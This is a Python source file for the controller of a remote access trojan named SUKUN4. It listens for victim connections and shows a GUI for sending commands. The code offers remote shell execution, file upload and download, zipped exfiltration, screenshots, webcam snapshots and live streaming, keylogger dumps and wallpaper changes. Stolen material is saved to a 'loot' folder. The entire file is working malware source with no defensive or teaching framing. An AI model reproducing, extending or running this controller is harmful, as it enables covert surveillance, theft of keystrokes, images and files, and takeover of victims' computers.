import socket
import threading
import sys
import os
import base64
import time
import argparse
import queue
import io
import banner
from banner import C

HOST = "0.0.0.0"
PORT = 54321
LOOT = "loot"

sessions = []
sessions_lock = threading.Lock()

# UI state — all on the Tk main thread
tk_root = None
banner_text = None
video_label = None
video_status = None
video_frame = None
output_text = None
entry = None
submit_btn = None

video_queue = queue.Queue(maxsize=3)
video_counters = {"shown": 0, "recv": 0, "started": time.time()}
video_visible = False
current_host = [None]

out_queue = queue.Queue()
prompt_queue = queue.Queue()


def ui_ok(msg):
    out_queue.put(("ok", msg))

def ui_err(msg):
    out_queue.put(("err", msg))

def ui_warn(msg):
    out_queue.put(("warn", msg))

def ui_info(msg):
    out_queue.put(("info", msg))

def ui_plain(msg):
    out_queue.put(("plain", msg))

def ui_prompt(host):
    prompt_queue.put(host)


# ---------------- Tk UI ----------------

def _tk_setup():
    global tk_root, banner_text, video_label, video_status, video_frame
    global output_text, entry, submit_btn
    import tkinter as tk
    from tkinter import scrolledtext, font

    tk_root = tk.Tk()
    tk_root.title("SUKUN4")
    tk_root.geometry("970x760")
    tk_root.configure(bg="#0d0d0d")

    # banner panel
    banner_frame = tk.Frame(tk_root, bg="#0d0d0d")
    banner_frame.pack(side="top", fill="x")

    banner_font = font.Font(family="Consolas", size=8)
    banner_text = tk.Text(
        banner_frame, height=9, bg="#0d0d0d", fg="#5cf",
        font=banner_font, bd=0, highlightthickness=0,
        padx=0, pady=0, wrap="none", cursor="arrow",
    )
    banner_text.pack(side="top", fill="x")
    banner_text.tag_configure("logo", foreground="#6cf", font=banner_font)
    banner_text.tag_configure("author", foreground="#ddd",
                              font=("Consolas", 10, "bold"))
    banner_text.tag_configure("muted", foreground="#666",
                              font=("Consolas", 9))
    banner_text.insert("end", banner.logo(colored=False), "logo")
    banner_text.insert("end", "\n")
    pad = " " * 32
    banner_text.insert("end", pad + "by ", "muted")
    banner_text.insert("end", banner.AUTHOR + "\n", "author")
    banner_text.insert("end", pad, "muted")
    banner_text.insert("end", "type 'help' for commands, 'exit' to quit\n\n", "muted")
    banner_text.configure(state="disabled")

    # video panel (hidden until webcam_stream)
    video_frame = tk.Frame(tk_root, bg="#000")
    video_label = tk.Label(video_frame, bg="#000")
    video_label.pack(fill="both", expand=True)
    video_status = tk.Label(video_frame, text="", fg="#8af", bg="#000",
                            anchor="w", font=("Consolas", 10))
    video_status.pack(fill="x")

    # output
    out_font = font.Font(family="Consolas", size=10)
    output_text = scrolledtext.ScrolledText(
        tk_root, wrap="word", bg="#0a0a0a", fg="#cfe",
        insertbackground="#cfe", font=out_font, state="disabled",
    )
    output_text.pack(fill="both", expand=True, padx=4, pady=(4, 0))
    output_text.tag_configure("ok", foreground="#5f5")
    output_text.tag_configure("err", foreground="#f66")
    output_text.tag_configure("warn", foreground="#fd5")
    output_text.tag_configure("info", foreground="#8af")
    output_text.tag_configure("prompt", foreground="#7cf")

    # command entry
    bar = tk.Frame(tk_root, bg="#0d0d0d")
    bar.pack(side="bottom", fill="x", padx=4, pady=4)
    entry = tk.Entry(bar, bg="#000", fg="#fff", insertbackground="#fff",
                     font=out_font)
    entry.pack(side="left", fill="x", expand=True)
    entry.bind("<Return>", lambda e: _submit())
    submit_btn = tk.Button(bar, text="send", command=_submit,
                           bg="#222", fg="#fff", font=out_font)
    submit_btn.pack(side="right", padx=(6, 0))

    _append_output("info", f"listener starting on {HOST}:{PORT}\n")
    _append_output("prompt", "SUKUN4 listener > ")

    tk_root.protocol("WM_DELETE_WINDOW", _on_close)
    tk_root.after(30, _tk_drain_output)
    tk_root.after(50, _tk_drain_video)
    tk_root.after(80, _tk_drain_prompt)


def _append_output(kind, text):
    tags = {"ok": "ok", "err": "err", "warn": "warn",
            "info": "info", "plain": None, "prompt": "prompt"}
    tag = tags.get(kind)
    output_text.configure(state="normal")
    if tag:
        output_text.insert("end", text, tag)
    else:
        output_text.insert("end", text)
    output_text.configure(state="disabled")
    output_text.see("end")


def _tk_drain_output():
    try:
        while True:
            kind, text = out_queue.get_nowait()
            _append_output(kind, text)
    except queue.Empty:
        pass
    tk_root.after(30, _tk_drain_output)


def _tk_drain_prompt():
    try:
        host = prompt_queue.get_nowait()
        current_host[0] = host
        tk_root.title(f"SUKUN4 — {host}" if host else "SUKUN4")
    except queue.Empty:
        pass
    tk_root.after(80, _tk_drain_prompt)


def _tk_drain_video():
    if not video_visible:
        tk_root.after(50, _tk_drain_video)
        return
    jpg = None
    try:
        while True:
            jpg = video_queue.get_nowait()
    except queue.Empty:
        pass
    if jpg is not None:
        try:
            from PIL import Image, ImageTk
            img = Image.open(io.BytesIO(jpg)).convert("RGB")
            photo = ImageTk.PhotoImage(img)
            video_label.configure(image=photo)
            video_label.image = photo
            video_counters["shown"] += 1
        except Exception as e:
            video_status.configure(text=f"decode err: {e}")
    elapsed = time.time() - video_counters["started"]
    if elapsed >= 1.0:
        fps = video_counters["shown"] / elapsed
        drop = video_counters["recv"] - video_counters["shown"]
        video_status.configure(
            text=f"live  {fps:5.1f} fps  shown {video_counters['shown']}  "
                 f"recv {video_counters['recv']}  drop {drop}"
        )
    tk_root.after(15, _tk_drain_video)


def _show_video():
    global video_visible
    if not video_visible:
        video_frame.pack(side="top", fill="x", expand=False,
                         before=output_text)
        video_visible = True
        video_counters["shown"] = 0
        video_counters["recv"] = 0
        video_counters["started"] = time.time()
        video_status.configure(text="waiting for frames…")


def _hide_video():
    global video_visible
    if video_visible:
        video_frame.pack_forget()
        video_visible = False
        video_queue.queue.clear()


def _on_close():
    try:
        with sessions_lock:
            for s in sessions:
                try:
                    s.conn.close()
                except OSError:
                    pass
        tk_root.destroy()
    except Exception:
        pass
    os._exit(0)


# ---------------- Session ----------------

class Session:
    def __init__(self, conn, addr):
        self.conn = conn
        self.addr = addr
        self.alive = True
        self.host = addr[0]
        self.frame_count = 0
        self.streaming = False
        self.state = "NORMAL"
        self.hs_ready_token = None
        self.hs_payload = None
        self.hs_result = queue.Queue()
        self.state_lock = threading.Lock()

    def recv_exact(self, n):
        buf = b""
        while len(buf) < n:
            chunk = self.conn.recv(n - len(buf))
            if not chunk:
                raise ConnectionError("peer closed")
            buf += chunk
        return buf

    def recv_frame(self):
        length = int.from_bytes(self.recv_exact(4), "big")
        return self.recv_exact(length)

    def send_frame(self, data):
        if isinstance(data, str):
            data = data.encode()
        self.conn.sendall(len(data).to_bytes(4, "big") + data)

    def _done(self):
        ui_prompt(self.host)

    def _handle_frame(self, raw):
        try:
            _, sid, b64 = raw.split(b":", 2)
            data = base64.b64decode(b64)
        except Exception:
            return
        video_counters["recv"] += 1
        try:
            video_queue.put_nowait(data)
        except queue.Full:
            try:
                video_queue.get_nowait()
            except queue.Empty:
                pass
            try:
                video_queue.put_nowait(data)
            except queue.Full:
                pass
        self.frame_count += 1
        if self.frame_count == 1:
            ui_info("stream received, frames arriving\n")
        try:
            os.makedirs(LOOT, exist_ok=True)
            with open(os.path.join(LOOT, f"{self.host}_latest.jpg"), "wb") as f:
                f.write(data)
        except OSError:
            pass

    def _dispatch(self, raw):
        if raw.startswith(b"SHELL:"):
            data = base64.b64decode(raw[6:])
            ui_plain("\n" + data.decode(errors="replace") + "\n")
            self._done()
            return
        if raw.startswith(b"CHUNK:"):
            data = base64.b64decode(raw[6:])
            ui_plain(data.decode(errors="replace"))
            return
        if raw == b"CHUNK_END":
            ui_plain("\n")
            self._done()
            return
        if raw.startswith(b"FRAME_END"):
            ui_ok(f"stream end ({self.frame_count} frames)\n")
            self.frame_count = 0
            try:
                tk_root.after(0, _hide_video)
            except Exception:
                pass
            self._done()
            return
        if raw.startswith(b"FRAME:"):
            self._handle_frame(raw)
            return
        if raw.startswith(b"ERR:"):
            ui_err(raw[4:].decode(errors="replace") + "\n")
            self._done()
            return
        if raw.startswith(b"SHOT:"):
            data = base64.b64decode(raw[5:])
            os.makedirs(LOOT, exist_ok=True)
            path = os.path.join(LOOT, f"{self.host}_{int(time.time())}.png")
            with open(path, "wb") as f:
                f.write(data)
            ui_ok(f"shot {path} ({len(data)}B)\n")
            self._done()
            return
        if raw.startswith(b"CAM:"):
            data = base64.b64decode(raw[4:])
            os.makedirs(LOOT, exist_ok=True)
            path = os.path.join(LOOT, f"{self.host}_{int(time.time())}.jpg")
            with open(path, "wb") as f:
                f.write(data)
            ui_ok(f"cam {path} ({len(data)}B)\n")
            self._done()
            return
        if raw.startswith(b"KEYLOG:"):
            data = base64.b64decode(raw[7:])
            os.makedirs(LOOT, exist_ok=True)
            path = os.path.join(LOOT, f"{self.host}_keylog.txt")
            with open(path, "ab") as f:
                f.write(data)
            ui_ok(f"keylog {len(data)}B -> {path}\n")
            try:
                ui_plain(data.decode(errors="replace") + "\n")
            except Exception:
                pass
            self._done()
            return
        if raw.startswith(b"FILE:"):
            try:
                _, name_b64, _, data_b64 = raw.split(b":", 3)
                name = base64.b64decode(name_b64).decode(errors="replace")
                data = base64.b64decode(data_b64)
            except Exception:
                ui_err("malformed FILE frame\n")
                return
            os.makedirs(LOOT, exist_ok=True)
            path = os.path.join(LOOT, f"{self.host}_{name}")
            with open(path, "wb") as f:
                f.write(data)
            ui_ok(f"file {path} ({len(data)}B)\n")
            self._done()
            return
        if raw.startswith(b"ZIP:"):
            try:
                _, name_b64, _, data_b64 = raw.split(b":", 3)
                name = base64.b64decode(name_b64).decode(errors="replace")
                data = base64.b64decode(data_b64)
            except Exception:
                ui_err("malformed ZIP frame\n")
                return
            os.makedirs(LOOT, exist_ok=True)
            path = os.path.join(LOOT, f"{self.host}_{name}")
            with open(path, "wb") as f:
                f.write(data)
            ui_ok(f"zip {path} ({len(data)}B)\n")
            self._done()
            return
        ui_plain("\n" + raw.decode(errors="replace") + "\n")
        self._done()

    def reader(self):
        try:
            while self.alive:
                raw = self.recv_frame()
                with self.state_lock:
                    st = self.state
                if st == "HANDSHAKE":
                    if self.hs_ready_token and raw == self.hs_ready_token:
                        try:
                            self.send_frame(self.hs_payload)
                        except OSError as e:
                            self.hs_result.put(("err", f"payload send: {e}"))
                            with self.state_lock:
                                self.state = "NORMAL"
                            continue
                        self.hs_ready_token = None
                        continue
                    if self.hs_ready_token is None:
                        with self.state_lock:
                            self.state = "NORMAL"
                        self.hs_result.put(("ok", raw.decode(errors="replace")))
                        continue
                    with self.state_lock:
                        self.state = "NORMAL"
                    self.hs_result.put(("warn", f"unexpected handshake: {raw[:80]!r}"))
                    self._dispatch(raw)
                    continue
                if raw in (b"WALL_READY", b"PUT_READY"):
                    continue
                self._dispatch(raw)
        except (ConnectionError, OSError):
            ui_err(f"session {self.host} closed\n")
            self.alive = False
            with sessions_lock:
                if self in sessions:
                    sessions.remove(self)
            with self.state_lock:
                self.state = "NORMAL"
            self.hs_result.put(("err", "session closed"))
            try:
                tk_root.after(0, _hide_video)
            except Exception:
                pass
            active = get_active()
            ui_prompt(active[0].host if active else None)

    def start(self):
        threading.Thread(target=self.reader, daemon=True).start()

    def _begin_handshake(self, first_cmd, ready, payload):
        while not self.hs_result.empty():
            try:
                self.hs_result.get_nowait()
            except queue.Empty:
                break
        with self.state_lock:
            self.hs_ready_token = ready
            self.hs_payload = payload
            self.state = "HANDSHAKE"
        try:
            self.send_frame(first_cmd)
        except OSError as e:
            with self.state_lock:
                self.state = "NORMAL"
            ui_err(f"send failed: {e}\n")
            return
        try:
            kind, msg = self.hs_result.get(timeout=15)
        except queue.Empty:
            with self.state_lock:
                self.state = "NORMAL"
            ui_err("handshake fail: timed out\n")
            self._done()
            return
        if kind == "ok":
            ui_ok(msg + "\n")
        elif kind == "warn":
            ui_warn(msg + "\n")
        else:
            ui_err(msg + "\n")
        self._done()

    def send_wallpaper(self, img_path):
        try:
            with open(img_path, "rb") as f:
                data = f.read()
        except OSError as e:
            ui_err(f"read fail: {e}\n")
            return
        self._begin_handshake(b"wallpaper_set", b"WALL_READY", data)

    def send_put(self, local_path, remote_path):
        try:
            with open(local_path, "rb") as f:
                data = f.read()
        except OSError as e:
            ui_err(f"read fail: {e}\n")
            return
        self._begin_handshake(f"put {remote_path}".encode(), b"PUT_READY", data)


def get_active():
    with sessions_lock:
        return list(sessions)


def split_paths(rest):
    rest = rest.strip()
    if rest.startswith('"'):
        end = rest.find('"', 1)
        if end == -1:
            return None
        local = rest[1:end]
        remainder = rest[end+1:].strip()
        if remainder.startswith('"'):
            end2 = remainder.find('"', 1)
            if end2 == -1:
                return None
            remote = remainder[1:end2]
        else:
            remote = remainder
        return local, remote
    parts = rest.rsplit(None, 1)
    if len(parts) != 2:
        return None
    return parts[0].strip('"'), parts[1].strip('"')


HELP_TEXT = """
shell <cmd>                            run shell command in tracked cwd
cd <dir>    cwd                        change / show working directory
bg <cmd>    jobs    job_out <id>       background jobs
job_kill <id>
shell_open  shell_send <text>  shell_close
stream <cmd>
dir [path]    get <remote>    zip <remote>
put "<local>" "<remote>"
screenshot    webcam    webcam_stream <sec> <fps>    webcam_stop
keylog_dump    keylog_clear
wallpaper "<local>"    wallpaper_restore
help    exit
""".strip()


def _submit(event=None):
    text = entry.get().strip()
    entry.delete(0, "end")
    if not text:
        return
    active = get_active()
    if not active and text not in ("help", "exit", "quit"):
        ui_warn("no session\n")
        ui_prompt(current_host[0])
        return
    if text in ("exit", "quit"):
        _on_close()
        return
    if text == "help":
        ui_plain("\n" + HELP_TEXT + "\n")
        ui_prompt(current_host[0])
        return
    if text.startswith("wallpaper "):
        path = text[len("wallpaper "):].strip().strip('"')
        active[0].send_wallpaper(path)
        return
    if text == "wallpaper_restore":
        active[0].send_frame(b"wallpaper_restore")
        return
    if text.startswith("put "):
        parsed = split_paths(text[4:])
        if parsed is None:
            ui_warn('usage: put "<local>" "<remote>"\n')
            ui_prompt(current_host[0])
            return
        local, remote = parsed
        active[0].send_put(local, remote)
        return
    if text.startswith("webcam_stream"):
        _show_video()
    try:
        active[0].send_frame(text)
    except OSError as e:
        ui_err(f"send failed: {e}\n")


def acceptor_loop(srv):
    while True:
        try:
            conn, addr = srv.accept()
        except OSError:
            return
        s = Session(conn, addr)
        s.start()
        with sessions_lock:
            sessions.append(s)
        ui_ok(f"session {addr[0]}:{addr[1]} open\n")
        ui_prompt(addr[0])


def parse_args():
    p = argparse.ArgumentParser(
        prog=banner.NAME,
        description=f"{banner.NAME} v{banner.VERSION} by {banner.AUTHOR} — {banner.TAGLINE}",
        add_help=False,
    )
    p.add_argument("-h", "--help", action="store_true")
    p.add_argument("--version", action="store_true")
    p.add_argument("--host", default=HOST)
    p.add_argument("--port", type=int, default=PORT)
    p.add_argument("--loot", default=LOOT)
    p.add_argument("--no-color", action="store_true")
    return p.parse_args()


def main():
    global HOST, PORT, LOOT
    args = parse_args()
    if args.version:
        print(f"{banner.NAME} v{banner.VERSION} by {banner.AUTHOR}")
        return
    if args.help:
        print(f"SUKUN4 v{banner.VERSION} by {banner.AUTHOR}")
        return
    HOST, PORT, LOOT = args.host, args.port, args.loot
    os.makedirs(LOOT, exist_ok=True)

    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        srv.bind((HOST, PORT))
    except PermissionError as e:
        print(f"bind {HOST}:{PORT} denied — {e}")
        sys.exit(1)
    srv.listen(5)

    threading.Thread(target=acceptor_loop, args=(srv,), daemon=True).start()

    _tk_setup()
    _tk_mainloop()


def _tk_mainloop():
    try:
        tk_root.mainloop()
    except KeyboardInterrupt:
        pass
    finally:
        os._exit(0)


if __name__ == "__main__":
    main()